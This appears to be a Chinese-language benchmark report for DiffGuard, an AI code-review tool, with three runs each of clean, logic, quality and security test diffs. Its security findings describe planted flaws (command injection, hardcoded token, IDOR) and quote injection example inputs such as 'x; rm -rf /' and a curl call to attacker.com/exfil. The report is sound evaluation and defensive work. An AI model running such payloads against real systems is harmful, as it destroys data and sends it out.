# DiffGuard 基准评测报告

## 总览

| 场景 | 轮次 | 问题数 | 状态 | 耗时(ms) |
|---|---:|---:|---|---:|
| clean | 1 | 0 | completed | 16997 |
| clean | 2 | 0 | completed | 15823 |
| clean | 3 | 0 | completed | 14068 |
| logic | 1 | 4 | completed | 41660 |
| logic | 2 | 10 | completed | 40591 |
| logic | 3 | 7 | completed | 32403 |
| quality | 1 | 4 | completed | 36220 |
| quality | 2 | 4 | completed | 39395 |
| quality | 3 | 3 | completed | 43350 |
| security | 1 | 6 | completed | 37900 |
| security | 2 | 11 | completed | 40725 |
| security | 3 | 5 | completed | 38818 |

---

## 每轮详情

### clean / 第 1–3 轮
三轮均为 `completed`，均未返回问题（`issues=[]`）。耗时分别为 16997 ms、15823 ms、14068 ms。
### logic / 第 1 轮
状态：completed；耗时：41660 ms

摘要：本次变更新增了账户管理相关的两个函数 get_balance 和 transfer，综合三位 Reviewer 的审查结果，共发现 5 个问题，其中 2 个为 CRITICAL 级别。最严重的问题是 transfer 函数中先执行扣款再检查目标账户是否为 None，导致资金凭空丢失（数据一致性缺陷）；其次是 get_balance 函数未处理账户不存在的情况，会抛出 AttributeError。此外还发现 transfer 函数缺少 amount 参数校验（负数转账可反向操作）以及缺少事务性保证等质量问题。这些问题涉及核心金融业务逻辑，建议在合并前必须修复。

- **[CRITICAL] 数据一致性缺陷 - 资金丢失** — account.py:5
  - 问题：transfer 函数先执行了 source.balance -= amount（扣款），然后才检查 target is None。当目标账户为 None 时函数返回 False，但扣款已经生效且未回滚，资金既不在源账户也未转入目标账户，造成资金凭空丢失。在金融业务中这是严重的逻辑错误，攻击者可利用此缺陷恶意消耗他人余额。
  - 建议：将 target is None 的校验移到所有余额变更操作之前。应先验证 source 和 target 均有效、source 余额充足，然后再执行扣款和入账操作。建议采用事务模式确保两个账户的变更原子性，或在异常时回滚。

- **[CRITICAL] 空指针解引用风险** — account.py:2
  - 问题：get_balance 函数中 accounts.get(account_id) 在 account_id 不存在时返回 None，随后直接访问 .balance 会抛出 AttributeError。在金融场景中未校验输入可能导致服务异常或信息泄露。
  - 建议：在访问 .balance 前检查 accounts.get(account_id) 的返回值是否为 None，例如：account = accounts.get(account_id); return account.balance if account else None，或抛出自定义异常明确表达账户不存在。

- **[WARNING] 缺少参数校验 - 负数转账** — account.py:4
  - 问题：transfer 函数未校验 amount 的合法性。当 amount 为负数时，source.balance -= amount 会增加源账户余额，target.balance += amount 会减少目标账户余额，导致反向资金流动，可被恶意利用。
  - 建议：在函数开头添加 amount > 0 的校验，同时建议校验 source.balance >= amount 以确保余额充足。

- **[WARNING] 缺少事务性保证** — account.py:4
  - 问题：transfer 函数分两步修改 source 和 target 的余额，中间没有事务保护。如果第二步操作因异常失败，源账户已扣款但目标账户未入账，造成数据不一致。在金融核心业务中，这种非原子性操作风险极高。
  - 建议：考虑引入事务机制（如数据库事务），确保扣款和入账操作要么全部成功，要么全部回滚。或至少在操作前验证所有前置条件，降低中间失败的概率。

### logic / 第 2 轮
状态：completed；耗时：40591 ms

摘要：审查完成，共识别 10 个问题。

- **[CRITICAL] 资金安全逻辑缺陷** — account.py:5
  - 问题：transfer 函数先执行 source.balance -= amount 扣款，然后才检查 target is None。当目标账户为 None 时，函数返回 False 但源账户已被扣款，资金将永久丢失。这是一个严重的资金完整性漏洞，攻击者或异常流程可导致资金凭空消失。
  - 建议：将 target is None 检查移到任何余额变更之前，确保在验证所有前置条件后才执行扣款和入账操作。建议采用先校验后执行的模式：先检查 target 是否有效、amount 是否合法，确认无误后再修改双方余额。

- **[WARNING] 空指针异常导致拒绝服务** — account.py:2
  - 问题：get_balance 函数直接调用 accounts.get(account_id).balance，当 account_id 不存在时 accounts.get() 返回 None，随后访问 .balance 会抛出 AttributeError。恶意用户可通过传入不存在的 account_id 触发未处理异常，可能导致服务崩溃或异常信息泄露。
  - 建议：在访问 .balance 之前先检查 accounts.get(account_id) 的返回值是否为 None，对不存在的账户返回适当的错误响应而非抛出异常。

- **[CRITICAL] 空指针解引用** — account.py:2
  - 问题：accounts.get(account_id) 在 account_id 不存在时返回 None，随后直接访问 .balance 会抛出 AttributeError。
  - 建议：先检查 accounts.get(account_id) 的返回值是否为 None，再访问 .balance 属性。例如：account = accounts.get(account_id); return account.balance if account else None

- **[CRITICAL] 数据一致性** — account.py:4
  - 问题：transfer 函数先执行 source.balance -= amount 扣款，之后才检查 target is None。当 target 为 None 时，源账户已被扣款但目标账户未收款，资金直接丢失，且函数仅返回 False 未回滚扣款操作。
  - 建议：将 target is None 的检查移到 source.balance -= amount 之前，确保在扣款前完成所有前置校验。

- **[WARNING] 输入校验缺失** — account.py:4
  - 问题：transfer 函数未校验 amount 是否为正值。当传入负数时，source.balance -= amount 会增加源账户余额，target.balance += amount 会减少目标账户余额，导致反向转账的资金安全问题。
  - 建议：在函数开头添加 amount 正值校验，例如：if amount <= 0: return False

- **[CRITICAL] 逻辑顺序错误** — account.py:6
  - 问题：transfer 函数中先从 source 扣款（第6行），之后才检查 target 是否为 None（第7行）。如果 target 为 None，source 已经被扣款但目标账户未收到款项，导致资金直接丢失。这是核心资金逻辑中的严重缺陷。
  - 建议：将 target is None 的校验移到 source.balance -= amount 之前，确保在执行任何资金操作前完成所有前置校验。

- **[CRITICAL] 空指针风险** — account.py:2
  - 问题：get_balance 中直接对 accounts.get(account_id) 的返回值调用 .balance，当 account_id 不存在时 accounts.get() 返回 None，会导致 AttributeError 崩溃。
  - 建议：在访问 .balance 前先检查 accounts.get(account_id) 是否为 None，并返回适当的默认值或抛出明确的业务异常。

- **[WARNING] 缺少输入校验** — account.py:5
  - 问题：transfer 函数未校验 amount 是否为合法值（如负数、零或非数值类型）。负数 amount 会导致 source 余额增加、target 余额减少，与转账语义完全相反。
  - 建议：在函数开头添加 amount 的合法性校验，确保 amount 为正数且不超过 source 当前余额。

- **[WARNING] 缺少余额校验** — account.py:6
  - 问题：transfer 函数在扣款前未检查 source.balance 是否足够覆盖 amount，可能导致账户余额变为负数。
  - 建议：在扣款前添加余额充足性检查：if source.balance < amount: return False 或抛出余额不足异常。

- **[WARNING] 错误处理不完善** — account.py:8
  - 问题：当 target 为 None 时仅返回 False，调用方无法区分是 target 不存在还是其他失败原因。同时 source 已被错误扣款但未回滚，函数返回 False 后状态不一致。
  - 建议：在所有校验通过前不修改任何账户状态；考虑使用明确的异常（如 ValueError）而非返回布尔值来表示失败，使错误信息更具描述性。

### logic / 第 3 轮
状态：completed；耗时：32403 ms

摘要：审查完成，共识别 7 个问题。

- **[WARNING] 业务逻辑安全漏洞 - 先扣款后校验** — account.py:5
  - 问题：transfer 函数在检查 target 是否为 None 之前，已经从 source.balance 中扣减了金额。如果 target 为 None，函数返回 False 但 source 的余额已被错误扣减，导致资金凭空消失。攻击者可以利用此缺陷，通过传入无效的 target 账户来恶意消耗其他账户的余额。
  - 建议：将 target 的校验逻辑移到任何余额变更操作之前：先检查 target is None 并返回 False，然后再执行 source.balance -= amount 和 target.balance += amount。同时建议增加对 amount 的合法性校验（如 amount > 0 且 source.balance >= amount）。

- **[CRITICAL] 空指针解引用** — account.py:2
  - 问题：accounts.get(account_id) 在 account_id 不存在时返回 None，直接访问 .balance 会抛出 AttributeError（NoneType has no attribute 'balance'）。
  - 建议：先检查 accounts.get(account_id) 的返回值是否为 None，例如：account = accounts.get(account_id); return account.balance if account else None

- **[CRITICAL] 数据一致性/资金安全** — account.py:5
  - 问题：transfer 函数先执行 source.balance -= amount 扣款，然后才检查 target is None。当 target 为 None 时，源账户资金已被扣除但目标账户未入账，导致资金丢失。这是一个严重的资金安全漏洞。
  - 建议：将 target is None 的检查移到扣款操作之前，确保在验证目标账户有效后再执行任何资金操作：if target is None: return False; source.balance -= amount; target.balance += amount

- **[CRITICAL] 业务逻辑顺序错误** — account.py:6
  - 问题：transfer 函数在执行 source.balance -= amount（扣款）之后才检查 target is None。如果 target 为 None，源账户已被扣款但目标账户未收到款项，导致资金凭空消失。这是一个严重的健壮性问题，涉及核心资金操作。
  - 建议：将 target is None 的校验移到扣款操作之前，确保所有前置条件满足后再执行资金变动。例如：if target is None: return False; source.balance -= amount; target.balance += amount; return True

- **[WARNING] 空指针风险** — account.py:2
  - 问题：get_balance 中 accounts.get(account_id) 在 account_id 不存在时返回 None，随后直接访问 .balance 会抛出 AttributeError。缺少对返回值为 None 的处理。
  - 建议：在访问 .balance 前检查 accounts.get(account_id) 的返回值是否为 None，或使用 accounts[account_id] 并在调用方处理 KeyError。

- **[WARNING] 缺少参数校验** — account.py:4
  - 问题：transfer 函数未校验 amount 是否为合法值（如负数或非数值类型）。如果 amount 为负数，会导致源账户余额增加、目标账户余额减少，与转账语义完全相反。
  - 建议：在函数开头添加参数校验，如 if amount <= 0: return False 或 raise ValueError。

- **[INFO] 缺少余额不足检查** — account.py:4
  - 问题：transfer 函数未检查 source.balance 是否足够支付 amount，可能导致账户余额变为负数。
  - 建议：在扣款前添加余额检查：if source.balance < amount: return False 或 raise InsufficientFundsError。

### quality / 第 1 轮
状态：completed；耗时：36220 ms

摘要：本次变更在 settings.py 中新增了 load_settings 和 classify 两个函数，共发现 4 个问题，其中 2 个为 CRITICAL 级别。关键问题包括：(1) load_settings 函数中文件句柄未正确关闭，在正常返回和异常捕获两条路径下均存在资源泄漏风险；(2) classify 函数逻辑不完整，多个条件分支未覆盖时隐式返回 None，可能导致调用方出错。此外还发现异常处理过于宽泛（except Exception 掩盖具体错误原因）以及 classify 函数圈复杂度过高（4层嵌套）两个 WARNING 级别问题。安全审查未发现可利用的安全漏洞。

- **[CRITICAL] 资源泄漏** — settings.py:2
  - 问题：load_settings 中使用 open(path) 打开文件但未使用 with 语句或 finally 块确保文件关闭。当 json.load 成功返回时直接 return，以及 json.load 抛出异常进入 except 分支返回 {}，两条路径下文件句柄均不会被关闭，导致资源泄漏。
  - 建议：使用 with open(path) as file 上下文管理器，或在 finally 块中显式调用 file.close()，确保文件句柄在任何情况下都能正确释放。

- **[CRITICAL] 函数逻辑不完整** — settings.py:7
  - 问题：classify 函数缺少 else 分支和默认 return 语句。当 value <= 0、value >= 10、value 为正奇数、或 0 < value <= 4 的偶数时，函数没有明确的返回值，会隐式返回 None。这很可能不是预期行为，调用方可能因接收到 None 而出错。
  - 建议：为所有条件分支提供明确的返回值，并在函数末尾添加默认 return 语句，确保函数在所有输入情况下都有明确且可预期的返回值。

- **[WARNING] 异常处理过于宽泛** — settings.py:4
  - 问题：except Exception 捕获了所有异常类型（包括 FileNotFoundError、JSONDecodeError、PermissionError 等），统一返回空字典 {}。这会掩盖具体的错误原因，调用方无法区分'文件不存在'和'文件格式错误'等不同场景，不利于问题排查。
  - 建议：针对具体的异常类型（如 FileNotFoundError、json.JSONDecodeError）分别处理，或至少在捕获异常时记录日志以便排查问题。

- **[WARNING] 圈复杂度过高** — settings.py:7
  - 问题：classify 函数使用了 4 层嵌套的 if 条件判断，可读性差且难以维护。随着分类规则的扩展，嵌套层级会进一步加深。
  - 建议：考虑通过提前返回（guard clause）减少嵌套层级，或将分类规则抽象为数据驱动的方式（如规则表/字典映射），降低圈复杂度。

### quality / 第 2 轮
状态：completed；耗时：39395 ms

摘要：本次变更在 settings.py 中新增了 load_settings 和 classify 两个函数，经合并去重后共发现 4 个问题，其中 2 个为 CRITICAL 级别。关键问题包括：(1) load_settings 函数中 open(path) 打开的文件在所有执行路径中均未被关闭，会导致文件描述符泄漏；(2) classify 函数逻辑不完整，多个分支路径无返回值，隐式返回 None。此外还发现异常处理过于宽泛（catch Exception 统一返回空字典）和 if 嵌套过深（4层）两个 WARNING 级别的代码质量问题。安全审查未发现可利用漏洞。

- **[CRITICAL] 资源泄漏** — settings.py:2
  - 问题：load_settings 函数中 open(path) 打开的文件在所有执行路径中都没有被关闭。正常返回时没有 close()，异常时 catch 后返回 {} 也没有 close()。这会导致文件描述符泄漏，在频繁调用时会耗尽系统文件句柄资源。
  - 建议：使用 with 语句管理文件资源：`with open(path) as file: return json.load(file)`，或使用 try-finally 确保文件关闭。

- **[CRITICAL] 逻辑不完整** — settings.py:11
  - 问题：classify 函数在 value <= 0、value >= 10、value 为奇数、或 value <= 4 时没有返回任何值（隐式返回 None），函数行为不完整，调用方可能得到意外的 None 结果，使用返回值时可能触发 AttributeError 等异常。
  - 建议：为所有可能的输入路径补充返回值，或在函数末尾添加默认返回值，确保函数对所有输入都有明确的行为。

- **[WARNING] 异常处理过于宽泛** — settings.py:5
  - 问题：catch Exception 会捕获所有异常（包括 JSONDecodeError、PermissionError、OSError 等），统一返回空字典 {}，调用方无法区分'文件不存在'、'权限不足'还是'JSON格式错误'，不利于问题排查。
  - 建议：根据实际需要捕获具体的异常类型（如 FileNotFoundError、json.JSONDecodeError），或至少在 except 块中记录日志以便追踪问题。

- **[WARNING] 嵌套过深** — settings.py:8
  - 问题：classify 函数中 if 嵌套达到 4 层，圈复杂度过高，可读性和可维护性差。
  - 建议：使用提前返回（guard clause）或组合条件表达式来减少嵌套层级，例如：`if not (0 < value < 10): return None` 然后继续后续判断。

### quality / 第 3 轮
状态：completed；耗时：43350 ms

摘要：本次变更在 settings.py 中新增了 load_settings 和 classify 两个函数，共发现 4 个问题（1 个 CRITICAL，3 个 WARNING）。关键问题是 load_settings 函数的文件句柄泄漏——在正常和异常路径中均未关闭文件，频繁调用可能耗尽系统资源。此外，classify 函数存在逻辑不完整问题，多个条件分支缺少返回值会隐式返回 None；异常处理过于宽泛，掩盖了不同类型的错误；classify 函数的 4 层 if 嵌套导致可读性差。安全方面未发现可利用的漏洞。

- **[CRITICAL] 资源泄漏** — settings.py:2
  - 问题：load_settings 中通过 open(path) 打开文件后，在异常或正常返回时均未关闭文件句柄，存在资源泄漏风险。json.load(file) 成功后直接 return，file 对象未被显式关闭；异常分支中同样未关闭。频繁调用时可能耗尽系统资源。
  - 建议：使用 with open(path) as file 上下文管理器，确保文件句柄在任何情况下都能正确关闭。例如：
with open(path) as file:
    try:
        return json.load(file)
    except Exception:
        return {}

- **[WARNING] 异常处理过于宽泛** — settings.py:4
  - 问题：except Exception 捕获了所有异常并返回空字典，会掩盖文件不存在、权限错误、JSON 格式错误等不同类型的错误，不利于问题排查。
  - 建议：区分捕获 FileNotFoundError、json.JSONDecodeError 等具体异常类型，或至少在 except 块中记录日志以便追踪问题。

- **[WARNING] 控制流逻辑错误** — settings.py:8
  - 问题：classify 函数逻辑不完整。当 value > 0 且 value < 10 且 value % 2 == 0 但 value <= 4 时，没有 return 语句；当 value % 2 != 0 时也没有 return；当 value >= 10 时没有 return；当 value <= 0 时也没有 return。这些路径都会隐式返回 None，调用方如果期望返回字符串类型，可能在使用返回值时出现 TypeError 或逻辑错误。此外函数使用了 4 层 if 嵌套，圈复杂度高，可读性差。
  - 建议：使用提前返回（early return）或组合条件表达式来减少嵌套层级，例如 if value <= 0 or value >= 10: return None；同时补全所有分类分支的逻辑，确保函数在所有输入路径下都有明确的返回值。

### security / 第 1 轮
状态：completed；耗时：37900 ms

摘要：本次变更新增了订单查询、导出和报告预览功能，经合并去重后共发现6个问题，其中4个为CRITICAL级别。关键安全问题包括：(1) 硬编码管理员令牌 ADMIN_TOKEN='demo-token'，存在认证绕过风险；(2) preview_report 函数通过 shell=True 拼接用户输入，存在命令注入/RCE漏洞；(3) list_orders 接收 customer_id 参数但完全忽略，执行 SELECT * FROM orders 导致水平越权访问；(4) SQL 查询未使用参数化方式，存在不安全数据库操作模式。此外还有敏感数据泄露（export_orders 在响应中暴露 ADMIN_TOKEN）和语义不清晰（export_orders 传递空字符串作为 customer_id）等问题。整体属于高风险代码，建议在上线前修复所有 CRITICAL 问题。

- **[CRITICAL] 命令注入 (Command Injection)** — app.py:8
  - 问题：preview_report 函数使用 shell=True 并将用户可控的 name 参数直接拼接到 shell 命令字符串中（'cat reports/' + name）。攻击者可通过构造如 'x; rm -rf /' 或 'x && curl attacker.com/exfil' 的输入执行任意系统命令，导致远程代码执行 (RCE)。
  - 建议：禁止使用 shell=True，改用参数列表形式：subprocess.check_output(['cat', os.path.join('reports/', name)])，并对 name 进行严格的白名单校验（如仅允许字母数字和特定字符），同时使用 realpath 校验防止路径穿越。也可直接使用 Python 内置 open() 读取文件。

- **[CRITICAL] 硬编码密钥/令牌 (Hardcoded Secret)** — app.py:1
  - 问题：ADMIN_TOKEN = 'demo-token' 将管理员认证令牌硬编码在源代码中。该令牌一旦泄露（如代码仓库被访问、反编译），攻击者可直接使用该令牌冒充管理员身份，导致认证绕过。
  - 建议：将令牌移至环境变量或安全的密钥管理服务（如 HashiCorp Vault、AWS Secrets Manager），通过 os.environ.get('ADMIN_TOKEN') 读取，并使用高熵随机值替代弱令牌。

- **[CRITICAL] 越权访问 (Broken Access Control / IDOR)** — app.py:5
  - 问题：list_orders 函数接收 customer_id 参数但完全忽略它，执行 SELECT * FROM orders 返回所有订单数据。任何客户都能查看其他客户的订单，构成水平越权访问漏洞，导致敏感数据泄露。export_orders 调用时传入空字符串 ''，进一步确认 customer_id 从未被使用。
  - 建议：在 SQL 查询中使用 customer_id 进行过滤：SELECT * FROM orders WHERE customer_id = ?，并使用参数化查询。同时确保 customer_id 来自已认证的会话而非用户输入。

- **[CRITICAL] SQL注入/不安全数据库操作** — app.py:3
  - 问题：list_orders 函数直接执行原始 SQL 字符串 'SELECT * FROM orders'，未使用参数化查询。虽然当前未拼接参数，但该模式极易在后续迭代中引入参数拼接导致 SQL 注入，属于不安全的数据库操作模式。
  - 建议：使用参数化查询，例如 db.execute('SELECT * FROM orders WHERE customer_id = ?', (customer_id,))，并确保使用 ORM 或参数化查询框架。

- **[WARNING] 敏感数据泄露 (Sensitive Data Exposure)** — app.py:7
  - 问题：export_orders 函数将 ADMIN_TOKEN 包含在返回结果中（{'token': ADMIN_TOKEN, ...}）。如果该返回值通过 API 响应返回给客户端，将导致管理员令牌泄露给普通用户。
  - 建议：从 API 响应中移除 ADMIN_TOKEN，仅返回订单数据。如需鉴权，应在请求处理阶段验证令牌而非在响应中返回。

- **[INFO] 语义不清晰** — app.py:6
  - 问题：export_orders 调用 list_orders('') 传递空字符串作为 customer_id，语义不明确——空字符串代表查询所有客户还是某个特定客户？这会让后续维护者难以理解意图。
  - 建议：如果意图是导出所有订单，建议使用更具语义的调用方式，例如提供 list_all_orders() 方法或使用 None 作为默认值来明确表示'查询所有'。

### security / 第 2 轮
状态：completed；耗时：40725 ms

摘要：审查完成，共识别 11 个问题。

- **[CRITICAL] 硬编码密钥/凭据** — app.py:1
  - 问题：ADMIN_TOKEN 硬编码为 'demo-token'，export_orders 函数直接返回该 token。攻击者可通过导出接口获取管理员令牌，导致权限提升或认证绕过。
  - 建议：从环境变量或安全的密钥管理服务（如 Vault、AWS Secrets Manager）读取 token，不要在代码中硬编码。同时避免通过 export_orders 接口暴露 token。

- **[CRITICAL] 命令注入** — app.py:6
  - 问题：preview_report 函数使用 subprocess.check_output('cat reports/' + name, shell=True)，用户输入 name 直接拼接到 shell 命令中。攻击者可通过构造如 'x; rm -rf /' 或 '$(malicious_command)' 的输入实现任意命令执行。
  - 建议：禁用 shell=True，使用参数列表形式传递命令：subprocess.check_output(['cat', 'reports/' + name])。同时严格验证 name 参数（如仅允许字母数字），并对最终路径做规范化校验防止路径穿越。

- **[WARNING] SQL注入** — app.py:2
  - 问题：list_orders 函数中 db.execute("SELECT * FROM orders") 未使用参数化查询。虽然当前查询无变量拼接，但函数接收 customer_id 参数却未使用，后续维护中极易演变为字符串拼接注入。
  - 建议：使用参数化查询：db.execute("SELECT * FROM orders WHERE customer_id = ?", (customer_id,))

- **[WARNING] 越权访问（IDOR）** — app.py:3
  - 问题：list_orders 函数接收 customer_id 参数，但 SQL 查询 SELECT * FROM orders 完全忽略了该参数，未按 customer_id 过滤。任何调用者都能获取所有客户的订单数据，构成水平越权访问漏洞。
  - 建议：在 SQL 查询中添加 WHERE customer_id = ? 条件，确保只返回当前用户有权访问的订单数据。

- **[CRITICAL] 命令注入** — app.py:6
  - 问题：preview_report 函数将用户输入的 name 直接拼接到 shell 命令字符串中，并使用 shell=True 执行。攻击者可以通过构造如 'x; rm -rf /' 的输入执行任意系统命令，导致服务器被完全控制。
  - 建议：使用 subprocess.check_output(['cat', 'reports/' + name]) 去掉 shell=True，并对 name 进行严格的白名单校验（如只允许字母数字和特定字符），同时验证拼接后的路径不会逃逸出 reports/ 目录。

- **[CRITICAL] SQL注入** — app.py:3
  - 问题：list_orders 函数直接执行 'SELECT * FROM orders'，虽然当前没有直接拼接用户输入到 SQL 中，但函数接收 customer_id 参数却完全未使用它，查询返回所有订单数据，存在越权访问问题。如果后续开发者基于此模式拼接 SQL，将直接导致 SQL 注入。
  - 建议：应使用参数化查询并按 customer_id 过滤：db.execute('SELECT * FROM orders WHERE customer_id = ?', (customer_id,))，确保数据隔离。

- **[WARNING] 敏感信息泄露** — app.py:5
  - 问题：export_orders 函数将硬编码的 ADMIN_TOKEN 作为返回值的一部分直接暴露给调用方。任何能调用此接口的用户都能获取管理员令牌，导致权限提升。
  - 建议：不应在业务返回值中包含管理员令牌。如果需要鉴权，应在请求处理层验证令牌，而非在响应中返回。

- **[WARNING] 硬编码凭据** — app.py:1
  - 问题：ADMIN_TOKEN = 'demo-token' 将管理员认证凭据硬编码在源代码中，任何能访问代码仓库的人都能获取该令牌，且无法在不重新部署的情况下轮换。
  - 建议：将敏感凭据移至环境变量或配置管理系统（如 Vault），通过 os.environ.get('ADMIN_TOKEN') 读取。

- **[WARNING] 误导性参数/死代码** — app.py:3
  - 问题：list_orders 函数接收 customer_id 参数但函数体内完全未使用该参数，SQL 查询未按 customer_id 过滤。参数存在却不起作用，会误导调用者认为数据已按客户隔离，实际返回了全部订单数据。
  - 建议：如果函数设计为按客户过滤订单，应在 SQL 查询中使用该参数（推荐参数化查询）；如果不需要过滤，则应移除该参数以避免误导调用者。

- **[WARNING] 脆弱实现** — app.py:9
  - 问题：preview_report 使用 shell=True 并通过字符串拼接构造命令，这种实现方式极其脆弱——文件名中的空格、特殊字符都会导致命令执行失败，且难以维护和调试。
  - 建议：避免使用 shell=True，改用参数列表形式调用（如 subprocess.check_output(['cat', 'reports/' + name])），或更好的方式是使用 Python 内置的文件读取操作替代外部命令调用。

- **[INFO] 职责不清晰** — app.py:6
  - 问题：export_orders 函数将 ADMIN_TOKEN 直接包含在返回值中返回给调用方。将内部认证凭据混入业务数据返回，模糊了数据导出与认证管理的职责边界，不利于后续维护和凭据轮换。
  - 建议：将认证逻辑与数据导出逻辑分离，export_orders 应仅负责返回订单数据，认证校验应由独立的中间件或装饰器处理。

### security / 第 3 轮
状态：completed；耗时：38818 ms

摘要：本次变更新增了多个后端函数（list_orders、export_orders、preview_report），经合并去重后共发现5个问题，其中3个为CRITICAL级别。关键安全问题包括：(1) 硬编码管理员令牌 ADMIN_TOKEN，可被攻击者直接获取绕过认证；(2) preview_report 函数存在命令注入漏洞，用户输入直接拼接到 shell 命令中，可实现任意命令执行；(3) list_orders 函数存在SQL注入/越权访问风险，接收 customer_id 参数但未使用，直接全表查询导致数据泄露。此外，export_orders 函数将 ADMIN_TOKEN 暴露在导出数据中，存在敏感信息泄露和职责混淆问题。这些问题均可被直接利用，建议在上线前全部修复。

- **[CRITICAL] 硬编码密钥/凭据** — app.py:1
  - 问题：ADMIN_TOKEN 被硬编码为 'demo-token' 在源代码中，攻击者可通过源码访问或反编译获取该令牌，从而绕过认证。该弱凭据且无法在不修改代码的情况下轮换。
  - 建议：将管理员令牌存储在环境变量或安全的密钥管理服务中：ADMIN_TOKEN = os.environ.get('ADMIN_TOKEN')，并使用足够强度的随机令牌。

- **[CRITICAL] 命令注入** — app.py:8
  - 问题：preview_report 函数将用户输入的 name 参数直接拼接到 shell 命令字符串中（'cat reports/' + name），并使用 shell=True 执行。攻击者可通过构造如 '; rm -rf /'、'$(malicious_command)' 或 '../../../etc/passwd' 等输入实现任意命令执行或路径穿越。
  - 建议：使用 subprocess 的列表参数形式（不使用 shell=True），并对 name 进行严格的白名单校验（仅允许字母数字和特定字符），或直接使用 Python 内置文件操作（如 open() 或 pathlib）替代 subprocess 调用 cat，同时验证 name 不包含路径分隔符。

- **[CRITICAL] SQL注入/越权访问** — app.py:3
  - 问题：list_orders 函数接收 customer_id 参数但完全未使用，直接执行 'SELECT * FROM orders' 查询所有订单。存在两个严重问题：(1) 任何调用者都能获取全部订单数据（越权访问）；(2) 函数签名暗示应按 customer_id 过滤但实际未实现，属于业务逻辑缺陷。
  - 建议：使用参数化查询按 customer_id 过滤：db.execute('SELECT * FROM orders WHERE customer_id = ?', (customer_id,))，如确实只需全表查询则应移除无用的 customer_id 参数以避免误导。

- **[WARNING] 敏感信息泄露/职责混淆** — app.py:6
  - 问题：export_orders 函数将 ADMIN_TOKEN 直接包含在返回结果中。任何能调用该接口的用户都能获取管理员令牌，导致认证凭据泄露和潜在的权限提升。同时，订单导出功能的职责应仅限于导出订单数据，将内部认证令牌混入导出内容违反了职责分离原则。
  - 建议：从导出结果中移除 ADMIN_TOKEN，仅返回订单业务数据。如需鉴权，应在调用 export_orders 之前验证请求方的权限，令牌的分发应由独立的认证/授权流程处理。

- **[WARNING] 脆弱实现** — app.py:8
  - 问题：preview_report 通过字符串拼接构建 shell 命令（'cat reports/' + name），这种实现方式非常脆弱——文件名中包含空格、特殊字符或路径分隔符都会导致命令执行异常或失败。
  - 建议：使用 Python 内置的文件操作（如 open() 或 pathlib）替代 subprocess 调用 cat 命令，并配合路径校验（如 os.path.join 和路径边界检查），使实现更加健壮。


---

## 评估说明

- `completed` 且问题数为 0 才可视为干净 Diff 的候选通过；`failed` 不能视为通过。
- 对照各场景的 `evaluation-checklist.md` 手工判定 TP、FP、FN。
- Token 为 0 不代表模型调用没有费用。

---

## Clean 场景结论

三轮均 `completed` 且 `0 issues`，本基准未出现结构化误报。此前的三条 `failed` 由已修复的摘要空值 Bug 引起，已从总览中剔除。

详细的逐条 TP/FP/FN 标注与指标见 [benchmark-annotations.md](benchmark-annotations.md)。
Security v2（真实 SQL 注入样例）重跑结果见 [benchmark-security-v2-evaluation.md](benchmark-security-v2-evaluation.md)。
